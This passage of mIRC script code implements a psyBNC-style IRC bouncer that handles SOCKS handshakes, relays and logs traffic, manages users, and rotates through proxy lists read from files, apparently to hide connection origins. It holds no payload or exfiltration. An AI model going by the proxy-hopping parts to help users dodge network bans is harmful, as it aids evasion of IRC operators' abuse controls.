    hadd -m $replace($Sockname,socks4.server,psyBNC) CONNECT !sErVer! | hadd -m $sockname NICK $pnick($replace($Sockname,socks4.server,psyBNC)) | hadd -m $sockname USER $puser($replace($Sockname,socks4.server,psyBNC)) 
    s4timeout 20
    set %s4time $ticks 
    .bset &bvar4 1 4 1 $gettok($longip($gettok($pserver($puser($replace($sockname,socks4.server,psyBNC))),2,58)),3,46) $gettok($longip($gettok($pserver($puser($replace($sockname,socks4.server,psyBNC))),2,58)),4,46) $replace($gettok($pserver($puser($replace($sockname,socks4.server,psyBNC))),1,58),.,$chr(32)) 0
    .sockwrite -n $sockname &bvar4 
    .bunset &bvar4 
  }
}
on *:SOCKREAD:socks4.server*:{
  if ($sockbr) { return } 
  .sockread &bsocks4 
  sockwrite $replace($sockname,socks4.server,psyBNC) &bsocks4
  if (PING isin $bvar(&bsocks4,1,$bvar(&bsocks5,0)).text) sockwrite -n $sockname PONG $remove($gettok($bvar(&bsocks4,1,$bvar(&bsocks5,0)).text,$calc($findtok($bvar(&bsocks4,1,$bvar(&bsocks5,0)).text,PING,32)+1),32),:)
  if ($bvar(&bsocks4,2) == 90) { 
    sockwrite -n $replace($sockname,socks4.server,psyBNC) : $+ -SOCKS4 NOTICE AUTH :Connected!  $calc($ticks - %s4time) $+ ms  
    unset %s4.time 
    sockwrite -n $sockname NICK : $+ $pnick($replace($Sockname,socks4.server,psyBNC))
    sockwrite -n $sockname USER $puser($sockname)  " $+ $user.name($sockname)   $+ " " $+ $serverip $+ " : $+ $user.name($sockname) 
    sockrename $sockname server $+ $deltok($remove($sockname,socks4.,server),95,1)


  }
  if ($sock($remove($sockname,socks4.)).ip == $null) {  

  }
  if (451 == $gettok($bvar(&bsocks4,1,$bvar(&bsocks5,0)).text,2,32)) { 
    sockwrite -tn $sockname NICK : $+ $pnick($replace($Sockname,socks4.server,psyBNC))
    sockwrite -tn $Sockname USER $puser($sockname) . . : $+ $user.name($sockname) 
    sockrename $sockname server $+ $deltok($remove($sockname,socks4.,server),95,1)

  }
  hadd -m $remove($sockname,socks4.) CONNECT !sErVer! | hadd -m $remove($sockname,socks4.) NICK $pnick($replace($Sockname,socks4.server,psyBNC)) | hadd -m $remove($sockname,socks4.) USER $puser($replace($Sockname,socks4.server,psyBNC))
}
on *:SOCKREAD:server*:{ 

  sockread %server 
  tokenize 32 %server 
  sockread $iif(66* iswm $sock($sockname).port,-n) $sock($sockname).rq &binvar
  if ($sock($replace($sockname,server,psybnc)).ip) sockwrite -b $replace($sockname,server,psybnc) -1 &binvar
  if ($len($bvar(&binvar,1,$bvar(&binvar,0)).text) < 340) hadd -m make text $bvar(&binvar,1,$bvar(&binvar,0)).text
  if (001 isin $gettok($hget(make,text),1-3,32)) { sockrename $sockname $replace($sockname,server,pfirc) }
  if (PING* iswm $hget(make,text)) { sockwrite -n $sockname PONG $hget(make,text) | halt }
  if (CONNECT*:66* iswm $hget(make,sockmark)) && (*NOTICE*AUTH*:* iswm $hget(make,text)) {
    if ($hget($replace($sockname,connect,serv),pass)) sockwrite -n $sockname $v1
    sockwrite -n $sockname $hget($replace($sockname,connect,serv),nick)  
    sockwrite -n $sockname $hget($replace($sockname,connect,serv),user)
    hdel make sockmark
  }
  if (451 == $gettok($hget(make,text),2,32)) {
    if ($hget($replace($sockname,connect,serv),pass)) sockwrite -n $sockname $v1
    sockwrite -n $sockname $hget($replace($sockname,connect,serv),nick)  
    sockwrite -n $sockname $hget($replace($sockname,connect,serv),user)
  }
  if (!$hget(make,anon)) window @PFDebug
  if (!$hget(make,anon)) .opnotice %fldchan $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+  $hget(make,text)
  if ($sock($replace($sockname,server,psyBNC)).ip) sockwrite -n $gettok($replace($sockname,server,psyBNC),1,95) $+ * %server
  if (*:*Error* iswm $1) && (*:Error*!* !iswm $1) {
    noticeauth psyBNC $+ $remove($sockname,server) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,server)) got disconnected from server. (From $pserver($puser(psyBNC $+ $remove($sockname,server))) $+ ) Reason: $2-
    halt
  }
  if (:*.*NOTICE* iswm $1-3) && (!server! !isin $hget(psyBNC $+ $remove($sockname,server),CONNECT)) {
    hadd -m psyBNC $+ $remove($sockname,server) CONNECT !Server! $sock($sockname).mark
    .timer*timeout* $+ $remove($sockname,socks5.,server,psyBNC) $+ * off
    sockwrite -n $sockname NICK : $+ $pnick($replace($sockname,server,psyBNC)) 
    sockwrite -n $sockname USER $puser($sockname) "." "." : $+ $check(USERNAME,$replace($sockname,server,psyBNC))
    %socknamenew = $check(sockname,$replace($sockname,server,psyBNC)) $+ _ $+ $r(0,9999)
    if (!$sock(server $+ $remove(%socknamenew,socks5.,server,psyBNC,$gettok(%socknamenew,2,95),_))) sockrename $sockname server $+ $deltok($remove(%socknamenew,socks5.,server,psyBNC,$gettok(%socknamenew,2,95),_),95,1)
    hadd -m $remove(%socknamenew,socks5.,server,psyBNC,$gettok(%socknamenew,2,95),_) CONNECT !sErVer! | hadd -m $remove(%socknamenew,socks5.,server,psyBNC,$gettok(%socknamenew,2,95),_) NICK $pnick($replace($Sockname,socks5.server,psyBNC)) | hadd -m $remove(%socknamenew,socks5.,server,psyBNC,$gettok(%socknamenew,2,95),_) USER $puser($replace($Sockname,socks5.server,psyBNC))
  }
  if (404 == $gettok(%server,2,32)) { sockwrite -n $sockname JOIN $gettok(%server,4,32) } 
  if (PING == $gettok(%server,1,32)) { sockwrite -n $sockname PONG $gettok(%server,2,32) | halt }
  if ($pnick($sockname) isin $1) || ($check(awaynick,$replace($sockname,server,psyBNC)) isin $1) && ($2 == NICK) { psy.nick $remove($3,:) $replace($sockname,server,psyBNC) }
  if (001 == $gettok(%server,2,32)) noticeauth psyBNC $+ $remove($sockname,server) $+ * $date $time :User $puser($sockname) () connected to $remove($1,:) ()
  if (005 == $gettok(%server,2,32)) && (CHANTYPES=# isin $gettok(%server,2-,32)) { sockwrite -n $gettok($replace($sockname,server,psyBNC),1,95) $replace($gettok(%server,1-,32),CHANTYPES=#,CHANTYPES=#&) PREFIX=(qaohv)~&@%+ | halt }
  if (00* iswm $gettok(%server,2,32)) { write $log.dir $+ $puser($sockname) $+ .Welcome  $replace($1-,CHANTYPES=#,CHANTYPES=#&) | if (001 == $2) { if ($isfile($welcome)) .remove $welcome |  psy.nick $gettok($wildtok($3-,*!*@*,1,32),1,33) $replace($sockname,server,psyBNC) } }
  if ($sock(psyBNC $+ $remove($sockname,server)).ip == $null) {
    if (PRIVMSG == $2) || (NOTICE == $2) {
      if ($3 == $pnick($sockname)) || ($3 == $check(AWAYNICK,$sockname)) {
        write $ppm $+ $puser($sockname) $+ .ppm :-psyBNC!psyBNC@Lam3rz.de $2-3 $date $time < $+ $remove($gettok($1,1,33),:) $+ > $4-
      }
      if ($chr(35) isin $3 ) {
        write $ppm $+ $puser($sockname) $+ .ppc :-psyBNC!psyBNC@Lam3rz.de $2-3 $date $time < $+ $remove($gettok($1,1,33),:) $+ > $4-
      }
    }
  }
  if (319 == $gettok(%server,2,32)) && ($pnick($sockname) isin $4) && (%psyBNC.offline != $null) { hadd -m $puser($sockname) CHANNELS $remove($replace($5-,$chr(32),$chr(44)),:,@,+,~,%,&) }
  if (303 != $gettok(%server,2,32)) && (372 != $gettok(%server,2,32)) { ;write $log.dir $+ $puser($sockname) $+ $replace($date,/,-) $+ .log $timestamp $1- }



}
on *:SOCKLISTEN:psyBNC*:{
  if ($sockerr > 0) { return } 
  set %temp $rand(1,999999999) 
  sockaccept psyBNC $+ %temp 
  if ($sock(*-a*).name) GLOBAL *-a* [ADMINMSG] Connection attempt from $sock(psyBNC $+ %temp).ip on port $sock($sockname).port $+ .
  hadd -m psyBNC $+ %temp CONNECT !connect!
  unset %psybnc.user.*
}
on *:SOCKCLOSE:psyBNC*:{
  if ($sock(*-a*).name) GLOBAL *-a* [ADMINMSG] Connection drop from $sock($sockname).ip on port $sock($sockname).port $+ .
  sockwrite -n * : $+ $pnick($sockname) $+ ! $+ $puser($sockname) $+ @ $+ $sock($usersock($1)).ip PART &PartyLine
  write_mainlog $puser($sockname) $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) Logged off. | sockwrite -n psyBNC* : $+ $pnick($sockname) $+ ! $+ $puser($sockname) $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) QUIT $iif($right($2-,-1),:Quit: $v1,:Client exited) | psyBNC $sockname GETOFFLINE $puser($sockname)
}
alias psy.nick {
  .hadd -m $puser($2) NICK $1
  .hadd -m $2 NICK $1
  .hadd -m $check(sockname,$2) NICK $1
  .hadd -m $sockname NICK $1
  if ($1 !isin $hget(partyline,nicks)) hadd -m partyline nicks $hget(partyline,nicks) $1
  .sockwrite -n psyBNC* : $+ $pnick($2) $+ ! $+ $puser($2) $+ @* NICK : $+ $1
  .write -l1 $welcome $1 001 $iif($check(awaynick,$2),$v1,$1) :Welcome to the Internet Relay Network $iif($check(awaynick,$2),$v1,$1)
}
alias welcome.nick { return $gettok($wildtok($read($welcome,1),*!*@*,1,32),1,33) }
on *:SOCKCLOSE:SERVER*:{ 
  if ($isfile($log.dir $+ $puser($sockname) $+ .Welcome) == $true) .remove $log.dir $+ $puser($sockname) $+ .Welcome
  if ($check(CHANNELS,$sockname)) { hdel  $puser($sockname) CHANNELS }
  if ($SOCK(psyBNC $+ $remove($sockname,server)).IP == $NULL) { 
  }
  if ($SOCK(psyBNC $+ $remove($sockname,server)).IP != $NULL) {
    .hadd -m psyBNC $+ $remove($sockname,server) CONNECT !AUTH! | .hadd -m psyBNC $+ $remove($sockname,server) NICK $pnick(psyBNC $+ $remove($sockname,server,socks4.,socks5.)) | .hadd -m psyBNC $+ $remove($sockname,server) USER $puser(psyBNC $+ $remove($sockname,server,socks4.,socks5.))
    if (!%error) noticeauth psyBNC $+ $remove($sockname,server,socks4.,socks5.) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,server,socks4.,socks5.)) got disconnected from server.
    .timer $+ psyBNC $+ $remove($sockname,server,socks4.,socks5.) $+ .BCONNECT 1 20 psyBNC psyBNC $+ $remove($sockname,server,socks4.,socks5.) BCONNECT $pserver($puser(psyBNC $+ $remove($sockname,server,socks4.,socks5.)))
  }
  :END
  sockclose $sockname
}
on *:SOCKCLOSE:PROXY.SERVER*:{ 
  if ($SOCK(psyBNC $+ $remove($sockname,proxy.server)).name) {
    .hadd -m psyBNC $+ $remove($sockname,proxy.server) CONNECT !AUTH! | .hadd -m psyBNC $+ $remove($sockname,proxy.server) NICK $pnick(psyBNC $+ $remove($sockname,proxy.server)) | .hadd -m psyBNC $+ $remove($sockname,proxy.server) USER $puser(psyBNC $+ $remove($sockname,proxy.server))
    .noticeauth $remove($sockname,proxy.server) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,proxy.server)) got disconnected from server.
    sockclose $sockname
    sockclose $remove($sockname,proxy.)
    .timer $+ psyBNC $+ $remove($sockname,proxy.server) $+ .BCONNECT 1 20 psyBNC psyBNC $+ $remove($sockname,proxy.server) BCONNECT $pserver($puser(psyBNC $+ $remove($sockname,proxy.server)))
  }
  if ($SOCK(psyBNC $+ $remove($sockname,proxy.server)).IP == $NULL) {
  }
}
;;;;;;;;;;;;;;;;;;;ALIAS;;;;;;;;;;;;;;;;;;;;;;;;
alias psyencrypt {
  %psy.ec = $1
  if (%psy.ec == localhost) %psy.ec = 127.0.0.1
  return $base($longip(%psy.ec),10,36) $+ . $+ $iif(%psy.name,%psy.name,$psyBNC_Name) $+ .IP
}
alias psybanlist return system\script\psyBNC\BANS.txt
alias psy.encrypt { return %encryptIP }
alias psy.maxuser { return %psy.maxuser }
alias setmaxusers { :lol | set %psy.maxuser $$?="Please enter numerical value" | if (!$$!) || ($$! !isnum) goto lol }
alias setpsyname { :loli | set %psy.name $?="Define a name (used for linking)" | if (!$$!) || ($$! !isalnum) goto loli }
alias psy.name return %psy.name

alias listen.bouncer { 
  psybnc start $iif(%psybnc.port == $null,31337,%psybnc.port)
}
alias p.error {
  if ($2 == 1) { noticeauth $1 $+ * No port given. Syntax is ADDSERVER ip:port | halt }
  if ($2 == 2) { noticeauth $1 $+ * No server given. Syntax is ADDSERVER ip:port | halt  }
  if ($2 == 3) { noticeauth $1 $+ * Syntax Error. Syntax is MADMIN user }
  if ($2 == 4) { noticeauth $1 $+ * Username already in use, choose another. }
  if ($2 == ALREADY_EXISTS) { noticeauth $1 $+ * Already an administrator. }
  if ($2 == 5) { noticeauth $1 $+ * No username given. Syntax is ADDUSER ident :username }
  if ($2 == 6) { noticeauth $1 $+ * No ident given. Syntax is ADDUSER ident :username }
  if ($2 == 7) { noticeauth $1 $+ * Username in use, choose another. }
  if ($2 == 8) { noticeauth $1 $+ * No username given. Syntax is ADDUSER ident :username }
  if ($2 == nosyntax) { noticeauth $1 $+ * Syntax Error. Syntax is SETUSERNAME (username). | halt }
  if ($2 == ERROR_FORMAT) { noticeauth $1 $+ * Syntax Error. Syntax is BCONNECT ( $+ $chr(35) or ip:port) }
  if ($2 == pnonamespecified) { noticeauth $1 $+ * No Name given. Use NAMEBOUNCER name.  }
  if ($2 == pnameillegal) { noticeauth $1 $+ * Name illegal, use only alpha numerical values.  }
  if ($2 == plinkerrhost) { noticeauth $1 $+ * No Host given. Use LINKTO name :host:port.  }
  if ($2 == plinkerrport) { noticeauth $1 $+ * No Port given. Use LINKTO name :host:port.  }
  if ($2 == plinkerrname) { noticeauth $1 $+ * No Name given. Use LINKTO name :host:port.  }
  if ($2 == p.linkerrhost) { noticeauth $1 $+ * No Host given. Use LINKFROM name :host:port.  }
  if ($2 == p.linkerrport) { noticeauth $1 $+ * No Port given. Use LINKFROM name :host:port.  }
  if ($2 == p.linkerrname) { noticeauth $1 $+ * No Name given. Use LINKFROM name :host:port.  }
  if ($2 == plinkerrdup) { noticeauth $1 $+ * Duplicated entry found, select another name. | halt  }
  if ($2 == ALREADY_CONNECTED) { noticeauth $1 $+ * You are still connected. }
  if ($2 == 9) { noticeauth $1 $+ * Syntax Error. Syntax is BKILL user reason  }
  if ($2 == 10) { noticeauth $1 $+ * No kill reason given. Syntax is BKILL user reason }
  if ($2 == NO_USER) { sockwrite -n $1 401 $pnick($1) -psyBNC ERROR: No such user $3 $+ . | sockwrite -n $1 401 $pnick($1) $3 ERROR: $3 not online. }
  if ($2 == NO_USER2kill) { noticeauth $1 He isnt online. Why killing a dead?. | halt }
  if ($2 = NO_ADMIN) { noticeauth $1 $+ * User specified is not an admin. }
  if ($2 == 13) { noticeauth $1 $+ * Syntax Error. Syntax is BNOTICE user message }
  if ($2 == 14) { noticeauth $1 $+ * No text given. Syntax is BNOTICE user message }
  if ($2 == 15) { noticeauth $1 $+ * Syntax Error. Syntax is PROXY (0/1/ip:port) [s4/s5/proxy]  }
  if ($2 == NO_LOG) { noticeauth $1 $+ * Specified log does not exist. }
  if ($2 = 18) { noticeauth $1 $+ * Syntax Error (1)  }
  if ($2 = 20) { noticeauth $1 $+ * Syntax Error (2)  }
  if ($2 = 19) { noticeauth $1 $+ * Syntax Error Invalid password .  }
  if ($2 = 232) { noticeauth $1 $+ * There's nothing to delete. | HALT }
  if ($2 = ADMIN_NEEDED) { noticeauth $1 $+ * GLOBAL needs admin flag to use.   }
  if ($2 = NO_SERV_SET) { noticeauth $1 $date $time :User $puser($1) () has no server added | halt }
}
alias psyBNC.sock { 
  psyBNC $1 BCONNECT $pserver($1)
}
alias check { if ($hget($2,$puser($1))) return $v1 | elseif ($hget($2,$1)) return $v1  }
alias puser { if ($hget($1,user)) return $v1 | elseif ($hget($hget($1,sockname),user)) return $v1  }
alias pnick { if ($hget($check(user,$1),nick)) return $v1 | elseif ($hget($1,nick)) return $v1 }
alias noticeauth { if ($sock($1).name) sockwrite -n $1 : $+ -psyBNC!psyBNC@Lam3rz.de PRIVMSG * : $+ $2- }

alias psy.priv { return $iif($check(ADMIN,$1,u) == yes,ADMIN,USER) }
alias msgauth { sockwrite -n $1 : $+ -psyBNC!psyBNC@Lam3rz.de PRIVMSG *: $+ $2- }
alias socket.join.channels {
  if ($1 == $null) { halt }
  hadd -mu30 $1 socket.chan.total $numtok($check(CHANNELS,$1,u),44)
  :START
  hinc -mu3 $1 socket.chan.tok 
  if ($hget($1,socket.chan.tok) > $hget($1,socket.chan.total)) { goto END }
  sockwrite -n $gettok($usersock($1),1,95) $+ * : $+ $pnick($1) $+ ! $+ $puser($gettok($usersock($1),1,95)) $+ @ $+ $sock($gettok($usersock($1),1,95)).ip JOIN $gettok($check(CHANNELS,$1,u),$hget($1,socket.chan.tok),44)
  sockwrite -n $replace($gettok($usersock($1),1,95),psybnc,server) $+ * JOIN $gettok($check(CHANNELS,$1,u),$hget($1,socket.chan.tok),44)
  sockwrite -n $replace($gettok($usersock($1),1,95),psybnc,server) $+ * NAMES $gettok($check(CHANNELS,$1,u),$hget($1,socket.chan.tok),44)
  goto START 
  :END
  return
}
alias pserver {
  return $check(SERVER1,$1,u)
}

alias ssww1 { if ($sock($1).name != $null) sockwrite -n $1 $2- }
alias proxy { 
  :R
  set %randomnumber $r(1,3)
  if (%randomnumber = 1) && ($isfile(sock4.txt)) {
    :S4
    inc %p.incs4
    set %p.maxs4 $lines(sock4.txt)
    set %s4 $replace($read(sock4.txt,%p.incs4),:,$chr(32))
    if (%p.incs4 >= %p.maxs4) { unset %p.incs4 | goto s4 }
    return %s4 s4
  }
  if (!isfile(sock4.txt)) && (%randomnumber == 1) goto r
  if (%randomnumber = 2) && ($isfile(sock5.txt))  {
    :S5
    inc %p.incs5
    set %p.maxs5 $lines(sock5.txt)
    set %s5 $replace($read(sock5.txt,%p.incs5),:,$chr(32))
    if (%p.incs5 >= %p.maxs5) { unset %p.incs5 | goto s5 }
    return %s5 s5
  }
  if (!isfile(sock5.txt)) && (%randomnumber == 2) goto r
  if (%randomnumber = 3)  && ($isfile($pxy)) {
    :PROXY
    inc %p.inc
    set %p.max $lines($pxy)
    set %pxy $replace($read($pxy,%p.inc),:,$chr(32))
    if (%p.inc >= %p.max) { unset %p.inc | goto PROXY }
    return %pxy pxy
  }
}
alias tell { if ($sock($sockname).ip != $null) sockwrite -n $sockname $1- | else .opnotice %fldchan $1- }
alias phadd { hadd psyBNC $1- | return $1- }
alias usersock { return $hget($1,sockname) }
alias pbfile return $log.dir $+ $remove($1,server,psyBNC) $+ .log
alias welcome { return $log.dir $+ $puser($sockname) $+ .welcome }
alias spaces return $+ $str($chr(32) $cr,$calc($1 -1)) $+
